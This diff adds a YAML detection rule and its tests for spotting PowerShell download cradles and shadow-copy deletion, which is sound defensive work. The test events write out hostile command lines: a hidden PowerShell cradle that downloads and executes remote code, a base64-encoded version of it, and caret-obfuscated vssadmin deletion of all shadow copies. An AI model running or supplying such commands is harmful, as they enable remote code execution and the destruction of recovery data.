@@ -1,0 +1,35 @@
+id: classic_malicious_command_line
+title: Download cradle, defense evasion or recovery inhibition on the command line
+description: >
+  Replaces many brittle Sigma string rules. Commands are decoded first (base64,
+  -EncodedCommand, caret and Unicode tricks), then matched exactly and semantically.
+severity: high
+action: alert
+response: [open_case]
+tags: [execution, defense_evasion, attack:T1059.001, attack:T1490]
+sequence:
+  - name: cmd
+    event: process.start
+    match:
+      any:
+        - regex: 'downloadstring|invoke-webrequest|iwr\s+http|net\.webclient'
+        - regex: 'vssadmin(\.exe)?\s+delete\s+shadows|wmic\s+shadowcopy\s+delete|recoveryenabled\s+no'
+        - semantic: {cluster: malicious_commands, threshold: 0.62}
+        - classifier: {label: destructive, threshold: 0.85}
+tests:
+  - name: plain download cradle
+    expect: fire
+    events:
+      - {type: process.start, host: ws-2, fields: {image: powershell.exe, command_line: "powershell -nop -w hidden -c iex (New-Object Net.WebClient).DownloadString('http://198.51.100.4/a')"}}
+  - name: encoded command
+    expect: fire
+    events:
+      - {type: process.start, host: ws-2, fields: {image: powershell.exe, command_line: "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AeAAvAGEAJwApAA=="}}
+  - name: caret-obfuscated shadow deletion
+    expect: fire
+    events:
+      - {type: process.start, host: ws-2, fields: {image: cmd.exe, command_line: "c^m^d /c v^s^s^a^d^m^i^n delete shadows /all /quiet"}}
+  - name: benign admin command
+    expect: no_fire
+    events:
+      - {type: process.start, host: ws-2, fields: {image: powershell.exe, command_line: "powershell Get-Service | Where-Object Status -eq Running"}}
